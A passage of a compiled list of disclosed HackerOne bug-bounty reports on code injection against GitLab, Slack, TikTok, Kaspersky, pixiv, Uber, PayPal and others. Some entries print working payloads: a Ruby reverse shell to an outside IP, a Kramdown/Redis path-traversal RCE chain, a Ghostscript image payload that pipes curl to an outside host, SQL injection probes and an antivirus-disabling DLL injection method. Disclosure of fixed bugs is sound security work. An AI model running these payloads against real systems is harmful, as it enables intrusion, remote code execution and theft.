git       5544  1.3  0.0  45604 27664 ?        S    13:14   0:00 /usr/bin/perl -w /opt/gitlab/embedded/bin/exiftool -all= --IPTC:all --XMP-iptcExt:all -tagsFromFile @ -ResolutionUnit -XResolution -YResolution -YCbCrSubSampling -YCbCrPositioning -BitsPerSample -ImageHeight -ImageWidth -ImageSize -Copyright -CopyrightNotice -Orientation -
git       5545  0.0  0.0      0     0 ?        Z    13:14   0:00 [sh] <defunct>
git       5551  0.0  0.0 105260 10840 ?        S    13:14   0:00 ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
git       5667  0.0  0.0   4504   740 ?        S    13:14   0:00 sh -c ps auxww
git       5668  0.0  0.0  34424  2864 ?        R    13:14   0:00 ps auxww
root      5952  0.0  0.0      0     0 ?        I    00:24   0:00 [kworker/5:2]
root      6812  0.0  0.0  54640  7080 ?        Ss   Mar08   0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx
gitlab-+  6813  0.0  0.0  59476 12544 ?        S    Mar08  18:42 nginx: worker process
gitlab-+  6814  0.0  0.0  59380 13704 ?        S    Mar08  18:28 nginx: worker process
gitlab-+  6815  0.0  0.0  59504 13088 ?        S    Mar08  18:57 nginx: worker process
gitlab-+  6816  0.0  0.0  59456 13048 ?        S    Mar08  19:35 nginx: worker process
gitlab-+  6817  0.0  0.0  59468 13396 ?        S    Mar08  18:41 nginx: worker process
gitlab-+  6818  0.0  0.0  59508 13700 ?        S    Mar08  20:20 nginx: worker process
gitlab-+  6819  0.0  0.0  59492 13220 ?        S    Mar08  19:33 nginx: worker process
gitlab-+  6820  0.0  0.0  59460 13420 ?        S    Mar08  22:00 nginx: worker process
gitlab-+  6821  0.0  0.0  59508 13420 ?        S    Mar08  24:15 nginx: worker process
gitlab-+  6822  0.0  0.0  59500 13348 ?        S    Mar08  20:53 nginx: worker process
gitlab-+  6823  0.0  0.0  59660 13588 ?        S    Mar08  27:47 nginx: worker process
gitlab-+  6824  0.0  0.0  59972 14116 ?        S    Mar08  37:52 nginx: worker process
gitlab-+  6825  4.0  0.0  63940 18592 ?        S    Mar08 1788:21 nginx: worker process
gitlab-+  6826  1.9  0.0  61436 15808 ?        S    Mar08 854:41 nginx: worker process
gitlab-+  6827  0.1  0.0  60120 14564 ?        S    Mar08  79:52 nginx: worker process
gitlab-+  6828  0.8  0.0  62348 16532 ?        S    Mar08 351:59 nginx: worker process
gitlab-+  6829  0.0  0.0  54836  3732 ?        S    Mar08   0:08 nginx: cache manager process
git       6952 17.6  0.1 1532460 109784 ?      Ssl  10:04  33:35 /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/sockets/socket -authBackend http://localhost:8080 -authSocket /var/opt/gitlab/gitlab-rails/sockets/gitlab.socket -documentRoot /opt/gitlab/embedded/service/gitlab-rails/public -pprofListenAddr  -apiLimit 5 -apiQueueDuration 60s -apiQueueLimit 200 -prometheusListenAddr 0.0.0.0:9229 -secretPath /opt/gitlab/embedded/service/gitlab-rails/.gitlab_workhorse_secret -logFormat json -config config.toml
git       7369 10.3  1.5 1859556 1033020 ?     Ssl  10:04  19:41 puma 5.1.1 (unix:///var/opt/gitlab/gitlab-rails/sockets/gitlab.socket,tcp://0.0.0.0:8080) [gitlab-puma-worker]
root      7522  0.0  0.0      0     0 ?        I    10:04   0:00 [kworker/11:2]
root      8263  0.0  0.0      0     0 ?        I    12:15   0:00 [kworker/14:0]
root      8266  0.0  0.0      0     0 ?        I    08:19   0:00 [kworker/0:2]
root      8581  0.1  0.0      0     0 ?        I    12:48   0:02 [kworker/u32:1]
root      9122  0.0  0.0      0     0 ?        I    10:37   0:00 [kworker/8:0]
git       9978 47.0  2.0 3182348 1362056 ?     Sl   11:43  42:45 puma: cluster worker 8: 7369 [gitlab-puma-worker]
consul   10871  0.5  0.2 257480 143704 ?       Ssl   2020 2836:38 /opt/consul/1.7.2/consul agent -config-file=/etc/consul/consul.json -config-dir=/etc/consul/conf.d
git      10980 51.1  1.8 2507012 1229264 ?     Sl   12:49  12:43 puma: cluster worker 2: 7369 [gitlab-puma-worker]
influxd+ 12182  0.0  0.0 188928  1044 ?        Ssl   2020   0:14 /usr/bin/influxdb-relay -config /etc/influxdb-relay/influxdb-relay.conf
root     12322  0.0  0.0      0     0 ?        I    12:49   0:00 [kworker/11:1]
root     12828  0.0  0.0   4384  1276 ?        S     2020   0:01 svlogd -tt /var/log/gitlab/puma
root     12831  0.2  0.0   4384  1228 ?        S     2020 1318:06 svlogd /var/log/gitlab/gitlab-workhorse
root     12853  0.0  0.0   4384  1260 ?        S     2020   0:02 svlogd -tt /var/log/gitlab/nginx
root     12856  0.0  0.0   4384   340 ?        S     2020   0:00 svlogd -tt /var/log/gitlab/logrotate
git      13196 48.0  2.1 2935068 1437312 ?     Sl   12:17  27:28 puma: cluster worker 10: 7369 [gitlab-puma-worker]
root     13379  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/7:1]
root     13382  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/10:1]
root     13611  1.0  0.0 1740892 38864 ?       Ssl  Jan29 1042:19 /usr/bin/process-exporter --config.path /etc/process-exporter/chef-configured.yaml --web.listen-address=:9256 -threads=false -gather-smaps=false
root     14478  0.0  0.0      0     0 ?        I    09:24   0:00 [kworker/2:0]
git      17155 50.3  1.8 2541576 1218444 ?     Sl   12:50  11:50 puma: cluster worker 15: 7369 [gitlab-puma-worker]
root     17904  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/2:2]
git      21109 48.3  1.9 2572804 1258580 ?     Sl   12:55   9:17 puma: cluster worker 5: 7369 [gitlab-puma-worker]
root     21296  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/8:1]
root     21299  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/1:0]
root     21301  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/7:0]
root     21306  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/15:1]
root     21376  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/9:0]
git      21698 48.0  2.2 3093788 1459416 ?     Sl   12:26  23:00 puma: cluster worker 9: 7369 [gitlab-puma-worker]
root     22003  0.2  0.0      0     0 ?        I    12:26   0:05 [kworker/u32:3]
root     22131  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/9:2]
root     22135  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/4:2]
root     22142  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/12:3]
root     22143  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/3:1]
root     22144  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/13:0]
root     22863  0.0  0.0 161112 54712 ?        Ssl  Jan18   0:15 /opt/chef/embedded/bin/ruby --disable-gems /usr/bin/chef-client -c /etc/chef/client.rb -i 1800 -s 300
root     24237  0.0  0.0 288904 59208 ?        Sl   Mar10   6:50 /opt/td-agent/bin/ruby /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid
root     24242 20.6  0.5 3044156 391860 ?      Sl   Mar10 8337:18 /opt/td-agent/bin/ruby -Eascii-8bit:ascii-8bit /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid --under-supervisor
git      24253 51.3  2.0 2857244 1349560 ?     Sl   12:29  23:03 puma: cluster worker 13: 7369 [gitlab-puma-worker]
root     24667  0.1  0.0      0     0 ?        I    11:29   0:11 [kworker/u32:4]
root     24911  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:2]
root     25156  0.2  0.0      0     0 ?        I    12:59   0:01 [kworker/u32:5]
root     25516  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/1:1]
git      25517 50.4  2.1 2870560 1443204 ?     Sl   12:30  21:58 puma: cluster worker 6: 7369 [gitlab-puma-worker]
git      25521 49.9  1.8 2550792 1218900 ?     Sl   13:00   7:06 puma: cluster worker 4: 7369 [gitlab-puma-worker]
root     25525  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/3:2]
root     25527  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/15:2]
root     26983  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/10:2]
root     27893  0.0  0.0      0     0 ?        I<    2020   0:00 [xfsalloc]
root     27894  0.0  0.0      0     0 ?        I<    2020   0:00 [xfs_mru_cache]
git      28051 49.9  1.8 2635012 1248076 ?     Sl   13:03   5:34 puma: cluster worker 11: 7369 [gitlab-puma-worker]
git      28140 50.3  2.1 2943756 1397844 ?     Sl   12:33  20:26 puma: cluster worker 14: 7369 [gitlab-puma-worker]
git      29132 49.0  2.0 3164444 1367952 ?     Sl   12:05  33:39 puma: cluster worker 1: 7369 [gitlab-puma-worker]
root     30224  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/14:1]
root     30233  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/0:1]
root     31940  0.0  0.0 278944 10648 ?        Ssl   2020   6:14 /usr/lib/accountsservice/accounts-daemon
root     32135  0.1  0.0      0     0 ?        I    13:07   0:00 [kworker/u32:0]
root     32388  0.0  0.0      0     0 ?        I    01:32   0:00 [kworker/4:0]
root     32453  5.3  0.0 1774984 40780 ?       Sl    2020 13156:17 /opt/prometheus/mtail/mtail -progs /opt/prometheus/mtail/progs -logs /var/log/apt/term.log,/var/log/syslog,/var/log/td-agent/td-agent.log,/var/log/gitlab/gitlab-rails/*.log,/var/log/gitlab/unicorn/unicorn_stderr.log,/var/log/gitlab/unicorn/unicorn_stdout.log -logtostderr
git      32635 49.4  2.1 3154204 1401116 ?     Sl   12:09  31:54 puma: cluster worker 12: 7369 [gitlab-puma-worker]
git      32703 48.7  1.8 2402308 1195496 ?     Sl   13:08   3:01 puma: cluster worker 7: 7369 [gitlab-puma-worker]
exit
```


### Impact
* Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file

### Examples
{F1257008}
{F1257009}

### What is the current *bug* behavior?
GitLab Workhorse will pass any file to ExifTool, greatly increasing the attack surface. The current bug is in the DjVu module of `ExifTool` which should ideally not ever be hit.

### What is the expected *correct* behavior?
* There must be better ways of convert C escape sequences than using `eval`
* Only the TIFF and JPEG modules should be used
* GitLab Workhorse could check if the file is a valid TIFF of JPEG before passing it to ExifTool

### Output of checks
This bug happens on GitLab.com

#### Results of GitLab environment info
```
System information
System:
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.2p137
Gem Version:	3.1.4
Bundler Version:2.1.4
Rake Version:	13.0.3
Redis Version:	6.0.10
Git Version:	2.29.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.10.2-ee
Revision:	cc4224220e6
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.6
URL:		http://192.168.0.127:9080
HTTP Clone URL:	http://192.168.0.127:9080/some-group/some-project.git
SSH Clone URL:	git@192.168.0.127:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	13.17.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

* Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file

---

### [Team members can trigger arbitrary code execution in Slack Desktop Apps via HTML Notifications](https://hackerone.com/reports/816156)

- **Report ID:** `816156`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Slack
- **Reporter:** @oskarsv
- **Bounty:** - usd
- **Disclosed:** 2021-05-09T15:12:56.523Z
- **CVE(s):** -

**Summary (team):**

A vulnerability in Slack's desktop clients allowed a user within a Slack team to send a malicious link to a teammate which would cause code to be executed on that victim's local computer. The issue hinged on a special type of Slack notification called HTML notifications. We resolved the issue by sanitizing the input to these notifications before rendering and by adding context isolation throughout our Desktop clients.  The sanitization portion of this fix is performed on Slack's backend and applies to all Slack users; our Desktop users need not take any action to be protected from this vulnerability.

---

### [RCE via unsafe inline Kramdown options when rendering certain Wiki pages](https://hackerone.com/reports/1125425)

- **Report ID:** `1125425`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 20000 usd
- **Disclosed:** 2021-04-20T17:35:23.805Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

When rendering wiki content with certain extensions such as `.rmd`,  `render_wiki_content` will call [`other_markup_unsafe`](https://gitlab.com/gitlab-org/gitlab/-/blob/v13.9.3-ee/app/helpers/markup_helper.rb#L145) which will end up calling `GitHub::Markup.render` from the `github-markup` gem.  Files with any extension can be uploaded by checking out the wiki with git, commiting the files and pushing the changes back.

Since `kramdown` is loaded, this will end up using it for the [markdown parser](https://github.com/github/markup/blob/v1.7.0/lib/github/markup/markdown.rb#L23) by calling `Kramdown::Document.new(content).to_html`

Kramdown has a special extension that allows for options to be [set inline](https://kramdown.gettalong.org/options.html), the example they give is: `{::options auto_ids="false" footnote_nr="5" syntax_highlighter_opts="{line_numbers: true\}" /}`

The default syntax highlighter is `rouge` which has an option [`formatter`](https://kramdown.gettalong.org/syntax_highlighter/rouge.html) that can be set via `syntax_highlighter_opts` in the inline options. This option gets used by [`formatter_class`](https://github.com/gettalong/kramdown/blob/REL_2_3_0/lib/kramdown/converter/syntax_highlighter/rouge.rb#L73):

```ruby
  def self.call(converter, text, lang, type, call_opts)
      opts = options(converter, type)
      call_opts[:default_lang] = opts[:default_lang]
      return nil unless lang || opts[:default_lang] || opts[:guess_lang]

      lexer = ::Rouge::Lexer.find_fancy(lang || opts[:default_lang], text)
      return nil if opts[:disable] || !lexer || (lexer.tag == "plaintext" && !opts[:guess_lang])

      opts[:css_class] ||= 'highlight' # For backward compatibility when using Rouge 2.0
      formatter = formatter_class(opts).new(opts)
      formatter.format(lexer.lex(text))
    end

  def self.formatter_class(opts = {})
      puts "formatter"
      puts opts[:formatter]
      case formatter = opts[:formatter]
      when Class
        formatter
      when /\A[[:upper:]][[:alnum:]_]*\z/
        ::Rouge::Formatters.const_get(formatter)
      else
        # Available in Rouge 2.0 or later
        ::Rouge::Formatters::HTMLLegacy
      end
    rescue NameError
      # Fallback to Rouge 1.x
      ::Rouge::Formatters::HTML
    end
```

So this a means that `::Rouge::Formatters.const_get(opts[:formatter]).new(opts)` will be called, where `opts` is controllable via the inline options to kramdown, allowing ruby objects to be initialised  so long as the validation of `/\A[[:upper:]][[:alnum:]_]*\z/` passes. The validation slightly restricts things, but pretty much any class without a namespace (`::` is not allowed) can be created. For example (the two `~~` should have an extra `~` but it's messing up the h1 formatting so will need to add it):

```markdown
{::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: CSV, line_numbers: true\}" /}

~~ ruby
    def what?
      42
    end
~~
```

Will result in a `CSV` object being created and then it will error with `private method 'format' called for #<CSV:0x00007fe4df7e26d0>` as it tries to use this as the formatter.

One of the loaded classes is gitlab is `Redis` from [redis-rb](https://github.com/redis/redis-rb) which has an option `driver` that is used to load the driver class:

https://github.com/redis/redis-rb/blob/v4.1.3/lib/redis/client.rb#L507
```ruby
    def _parse_driver(driver)
      driver = driver.to_s if driver.is_a?(Symbol)

      if driver.kind_of?(String)
        begin
          require_relative "connection/#{driver}"
        rescue LoadError, NameError => e
          begin
            require "connection/#{driver}"
          rescue LoadError, NameError => e
            raise RuntimeError, "Cannot load driver #{driver.inspect}: #{e.message}"
          end
        end

        driver = Connection.const_get(driver.capitalize)
      end

      driver
    end
```

As both `require_relative` and `require` allow for directory traversal, supplying a `driver` option such as `../../../../../../../../../../tmp/a.rb` will cause that file to be evaluated.

One of the ways to get a file to a known location in gitlab is to attach a file in the description of a snippet. When attaching, a markdown link will be created similar to: `[file.rb](/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb)`. The default `gitlab_rails['uploads_directory']` is `/var/opt/gitlab/gitlab-rails/uploads` meaning the final file location will be `/var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb`.

Combining all of of this, we can create the following `.rmd` file to execute our payload (add `~` to both of the `~~`):
```
{::options auto_ids="false" footnote_nr="5" syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/1cd3e965551892a4c0c1af01ef2f2ad7/file.rb\}" /}

~~ ruby
def what?
  42
end
~~
```

### Steps to reproduce

1. Create a new snippet with any title and file
1. In the description, click `Attach a file` and select the final ruby payload such as:
    ```ruby
puts "hello from ruby"
`echo vakzz was here > /tmp/vakzz`
    ```
1. Make note of the upload path: `/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb`
1. Create a new project
1. Click Wiki and create a default home page
1. Hit `Clone repository` to get the clone command
1. Clone the repo `git clone git@gitlab-docker.local:root/proj1.wiki.git` and add the following file `page1.rmd` using the path from above (add `~` to both the the `~~`): 

    ```
{::options syntax_highlighter="rouge" syntax_highlighter_opts="{formatter: Redis, driver: ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb\}" /}
~~ ruby
def what?
  42
end
~~
    ```

1. Push the changes `git add -A . && git commit -m "page1.rmd" && git push`
1. Refresh the wiki, there should now be `page1 ` of the right hand side
1. Click and load `page1`
1. In the gitlab logs you should see something like:

    ```
wrong constant name ../../../../../../../../../../var/opt/gitlab/gitlab-rails/uploads/-/system/user/1/c4119c5b144037f708ead7295cea4dd0/payload.rb
lib/gitlab/other_markup.rb:11:in `render'
app/helpers/markup_helper.rb:280:in `other_markup_unsafe'
app/helpers/markup_helper.rb:145:in `markup_unsafe'
app/helpers/markup_helper.rb:130:in `render_wiki_content'
app/views/shared/wikis/show.html.haml:30
    ```

1. Looking at `/tmp` you can see that the payload was executed:

    ```bash
root@gitlab-docker:~# cat /tmp/vakzz
vakzz was here
    ```

### Impact
Allows any user with push access to a wiki to execute arbitrary ruby code.

### Examples
Example page using the inline options to change the highlighter from rouge to `minted` - https://gitlab.com/vakzz-h1/kramdown-wiki/-/wikis/page1

### What is the current *bug* behavior?
Inline options can be set when rendering kramdown documents

### What is the expected *correct* behavior?
`forbidden_inline_options` could be use to disable the dangerous inline options - https://kramdown.gettalong.org/options.html

### Output of checks

#### Results of GitLab environment info

```
System information
System:
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.2p137
Gem Version:	3.1.4
Bundler Version:2.1.4
Rake Version:	13.0.3
Redis Version:	6.0.10
Git Version:	2.29.0
Sidekiq Version:5.2.9
Go Version:	unknown

GitLab information
Version:	13.9.1-ee
Revision:	8ae438629fa
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.5
URL:		http://gitlab-docker.local
HTTP Clone URL:	http://gitlab-docker.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-docker.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	13.16.1
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Allows any user with push access to a wiki to execute arbitrary ruby code.

---

### [RCE on TikTok Ads Portal](https://hackerone.com/reports/1024575)

- **Report ID:** `1024575`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** TikTok
- **Reporter:** @freesec
- **Bounty:** - usd
- **Disclosed:** 2021-04-15T17:47:50.275Z
- **CVE(s):** -

**Summary (team):**

The video upload endpoint on the TikTok Ads portal was potentially susceptible to remote code execution (RCE) due to a ffmpeg misconfiguration. We thank @ bubbounty for reporting this to our team and confirming the resolution.

**Summary (researcher):**

During my research on the TikTok Ads portal I found a RCE thought the video creation process resulting to a root access on the system mainly due to a misconfugration ffmpeg. A simple id and ls commands results were reported and the TikTok team fixed the weakness quickly.

---

### [RCE in ██████ subdomain via CVE-2017-1000486](https://hackerone.com/reports/1067291)

- **Report ID:** `1067291`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @skarsom
- **Bounty:** - usd
- **Disclosed:** 2021-04-08T18:52:14.367Z
- **CVE(s):** CVE-2017-1000486

**Vulnerability Information:**

**Summary:**
The application at ████████/ftn-Website/ uses primefaces 5.3 but not 5.3.8, making it vulnerable to unauthenticated RCE CVE-2017-1000486.

## Step-by-step Reproduction Instructions

1. Get the publicly available POC for this vulnerability here: https://github.com/pimps/CVE-2017-1000486
2. Execute:  `python primefaces.py ███/ftn-Website/ -c id`
3. Success: `uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=system_u:system_r:tomcat_t:s0`

## Product, Version, and Configuration (If applicable)
primefaces 5.3

## Suggested Mitigation/Remediation Actions
Update primefaces.

## Impact

An unauthenticated, 3rd-party attacker or adversary can execute remote code on restsvr1.ftn.research.usafa.edu as the unix `tomcat` user. Note that this service uses a DoD IP, suggesting an attacker could potentially pivot elsewhere afterwards.

---

### [[Fixed] A vulnerability in KAVKIS 2020 products family allows full disabling of protection](https://hackerone.com/reports/870615)

- **Report ID:** `870615`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Kaspersky
- **Reporter:** @abbadeed
- **Bounty:** - usd
- **Disclosed:** 2021-03-31T08:33:27.252Z
- **CVE(s):** -

**Vulnerability Information:**

> Note! Thank you for your report. For the purposes of the further analysis of the vulnerability, that you kindly report to us, could you please fill *all* fields [in square brackets]. This information will help us to respond you more quickly and triage your report. Thanks a lot for your assistance.

I use Translator, T_T Sorry

**Summary**
can turn off anti-virus functionality in an external process.

**Description**
Use the SetWindowsHookEx function to inject the DLL. The ClientLoadLibrary was hooked to prevent injection, but dlls with specific file names were injectable(tiptsf.dll). After that, I was able to hook some WinAPIs and turn off antivirus.

**Environment**
- Scope: Application
- Product name: Kaspersky Internet Security
- Product version:20.0.14.1085
- OS name and version (incl SP): Windows 10 RS5
- Attack type: Bypass
- Maximum user privileges needed to reproduce your issue: no privileges

**Steps to reproduce**
1. FindWindow and get hwnd from kaspersky internet security(avpui.exe)
2. I have invoked the SetWindowsHookEx function to inject the DLL.
3. After hooking the TrackPopupMenu function, send a pop-up message through PostMessage.
4. When self-protection is turned on, it generates a new avpui.exe and then generates a Dialog that asks users to confirm. the generated process also injects dll.
5. In the newly created avpui.exe, hook the IsDialogMessageW function and switch to a message that occurs when you click the OK button.
6. download ransomware & run.

## Impact

The bypass function can be used to turn off the antivirus before the malware is activated.

---

### [RCE due to ImageTragick v2](https://hackerone.com/reports/402362)

- **Report ID:** `402362`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** pixiv
- **Reporter:** @chaosbolt
- **Bounty:** 2000 usd
- **Disclosed:** 2021-03-16T15:35:11.606Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Pixiv team! Your Image processing process suffering from ImageTragick v2. Issue is caused by ghostscript RCE findnings.

How to reproduce:
PATCH /design
Host: manage.booth.pm

send following image:
```
------WebKitFormBoundaryXX05yrKS4g8d9CWh
Content-Disposition: form-data; name="shop[header]"; filename="imagetragick.jpeg"
Content-Type: image/jpeg

%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%curl https://avtohanter.ru/qwetest) currentdevice putdeviceprops
------WebKitFormBoundaryXX05yrKS4g8d9CWh--
```

How to fix:
Update ImageMagick, should help

## Impact

Remote Code Execution

---

### [RCE via npm misconfig -- installing internal libraries from the public registry](https://hackerone.com/reports/1007014)

- **Report ID:** `1007014`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Uber
- **Reporter:** @alexbirsan
- **Bounty:** 9000 usd
- **Disclosed:** 2021-02-24T01:28:41.803Z
- **CVE(s):** -

**Summary (team):**

The hacker spotted some orphaned references to Uber-branded Node.js library packages and claimed them on the public NPM registry to run their own proof-of-concept code.

**Summary (researcher):**

[Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610?sk=991ef9a180558d25c5c6bc5081c99089)

---

### [SQL Injection in www.hyperpure.com](https://hackerone.com/reports/1044716)

- **Report ID:** `1044716`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Eternal
- **Reporter:** @hoteyes
- **Bounty:** 2000 usd
- **Disclosed:** 2021-02-22T07:34:13.808Z
- **CVE(s):** -

**Vulnerability Information:**

Vulnerable Request :

PUT /consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc    HTTP/1.1
Host: api.hyperpure.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
X-Client: consumer
X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a
HeaderRoute: v2
APIVersion: 4.2
AppType: web
Content-Length: 246
Origin: https://www.hyperpure.com
Connection: close
Referer: https://www.hyperpure.com/register

{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"█████","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}

The above request is used to create sales lead with the data the sales lead id is produced and verified by the domain.

Base Response Received: 

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 68
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://www.hyperpure.com
x-envoy-upstream-service-time: 166
Server: envoy
Date: Thu, 26 Nov 2020 18:48:34 GMT
Connection: close
Vary: Accept-Encoding

{"response":{"salesLeadId":"6b6a8a5a-4a74-46db-b2fe-32a46f927ecc"}}


Now we will be executing following steps to verify if  "AND "  & "OR" statements work.

1) Proving AND condition working while using it with a valid sales id  " AND 1 = "1 --+-   
2) Proving AND condition false with working sales lead using AND 1=0.
3) Proving adding cool as a sales lead by using OR 1=1 , which always states true.

## Impact

Adding random sales ID in the database using PUT statement and populating it.

---

### [Dashboard sharing enables code injection into ████ emails](https://hackerone.com/reports/904064)

- **Report ID:** `904064`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:08:13.432Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An attacker is able to share their dashboard with other █████████ users. When sharing their dashboard, the message is not fully sanitized for HTML characters before sending to the recipient. This allows the attacker to craft a believable spearphishing e-mail coming from an e-mail address owned by the ███████.

## Step-by-step Reproduction Instructions

1. Create an account or sign into ██████.
2. Browse to ███████/█████
3. Create a dashboard by clicking the dropdown menu and selecting `New Dashboard`.
████
4. Once you create the dashboard, go back to ███/██████ and select the dashboard you created.
5. You should see a `share` icon in the top right. Click this and click `Add groups and users`.
███
6. If you start typing in the `To:` field, a list of names should populate. Select the name of an account you own.
█████████
7. Check the `Send an email invitation box`. Populate the `Message` field with your spearphishing attempt (this can contain various HTML elements) and click `Share`.
██████
8. The victim will receive an e-mail from ██████████ with the injected HTML. As you can see below, the `<img>` tag did not work correctly but the other formatting seemed to work fine. This allows the adversary to get very creative..
██████████
*Note: the message above says "...shared with you by unagi unagi.", however an attacker could simply sign up with a first/last name of "████████" or something similar to make this more believable.*

## Suggested Mitigation/Remediation Actions
Sanitize all HTML tags prior to sending the e-mail to the recipient.

## Impact

An adversary could conduct a spearphishing campaign from an ██████ mail server - the scale of effects would be dependent on the creativity of the attacker and the gullibility of the victim.

---

### [RCE via npm misconfig -- installing internal libraries from the public registry](https://hackerone.com/reports/925585)

- **Report ID:** `925585`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** PayPal
- **Reporter:** @alexbirsan
- **Bounty:** 30000 usd
- **Disclosed:** 2021-02-09T18:00:54.708Z
- **CVE(s):** -

**Summary (team):**

A Bug Bounty researcher identified an issue where certain development projects defaulted to the public NPM registry, instead of using the intended internal packages. Since the packages on the public registry did not exist, the researcher created these and observed they were downloaded. Had these packages been registered with malicious intent, it is possible for internal development to have included this code. While there are additional checks and controls in the development pipeline, this could have caused significant issues for internal systems. Thanks to the researcher's report, PayPal was able to mitigate the issue with the public registry and confirmed no evidence of prior malicious activity.

**Summary (researcher):**

[Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610?sk=991ef9a180558d25c5c6bc5081c99089)

---

### [[imagickal] Remote Code Execution](https://hackerone.com/reports/973245)

- **Report ID:** `973245`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @solov9ev
- **Bounty:** - usd
- **Disclosed:** 2021-01-14T08:39:54.544Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report `RCE` in `imagickal`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** imagickal
**version:** 4.2.0
**npm page:** `https://www.npmjs.com/package/imagickal`

## Module Description

node wrapper for ImageMagick commands

## Module Stats

[42] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection while processing a photo

## Steps To Reproduce:

- Run `npm i imagickal`
